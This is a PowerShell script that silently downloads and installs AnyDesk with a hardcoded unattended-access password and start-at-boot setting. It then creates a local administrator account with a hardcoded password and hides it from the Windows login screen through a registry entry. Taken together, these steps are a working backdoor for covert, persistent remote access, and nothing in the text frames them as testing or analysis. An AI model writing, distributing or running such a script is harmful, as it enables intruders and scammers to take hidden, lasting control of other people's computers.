# Must be run as Administrator

# ----------------- CONFIG -----------------
$anydeskUrl = "http://download.anydesk.com/AnyDesk.exe"
$password = "J9kzQ2Y0qO"
$adminUsername = "oldadministrator"
$adminPassword = "jsbehsid#Zyw4E3"
# -----------------------------------------

function Ensure-Admin {
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        Write-Host "❌ Please run this script as Administrator." -ForegroundColor Red
        exit
    }
}

function Ask-InstallPath {
    $defaultPath = "C:\ProgramData\AnyDesk"
    $customPath = Read-Host "📁 Enter install path for AnyDesk or press Enter for default [$defaultPath]"
    if ([string]::IsNullOrWhiteSpace($customPath)) {
        return $defaultPath
    } else {
        return $customPath
    }
}

function Install-AnyDesk {
    param([string]$installPath)

    Write-Host "`n📦 Installing AnyDesk to: $installPath" -ForegroundColor Cyan

    if (-not (Test-Path $installPath)) {
        New-Item -ItemType Directory -Path $installPath | Out-Null
    }

    $anydeskExe = Join-Path $installPath "AnyDesk.exe"

    Write-Host "⏬ Downloading AnyDesk..." -ForegroundColor Yellow
    Invoke-WebRequest -Uri $anydeskUrl -OutFile $anydeskExe

    Write-Host "🚀 Installing AnyDesk silently..." -ForegroundColor Yellow
    Start-Process -FilePath $anydeskExe -ArgumentList "--install `"$installPath`" --start-with-win --silent" -Wait

    Write-Host "🔐 Setting password for unattended access..." -ForegroundColor Yellow
    Start-Process -FilePath $anydeskExe -ArgumentList "--set-password=$password" -Wait

    Write-Host "✅ AnyDesk installed and configured." -ForegroundColor Green
}

function Create-HiddenAdmin {
    Write-Host "`n👤 Creating hidden admin user..." -ForegroundColor Cyan

    net user $adminUsername $adminPassword /add
    net localgroup Administrators $adminUsername /add

    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    New-ItemProperty -Path $regPath -Name $adminUsername -PropertyType DWord -Value 0 -Force | Out-Null

    Write-Host "✅ Hidden admin user '$adminUsername' created." -ForegroundColor Green
}

# ------------------ EXECUTION ------------------
Ensure-Admin
$installPath = Ask-InstallPath
Install-AnyDesk -installPath $installPath
Create-HiddenAdmin

Write-Host "`n🎉 All tasks completed successfully!" -ForegroundColor Green
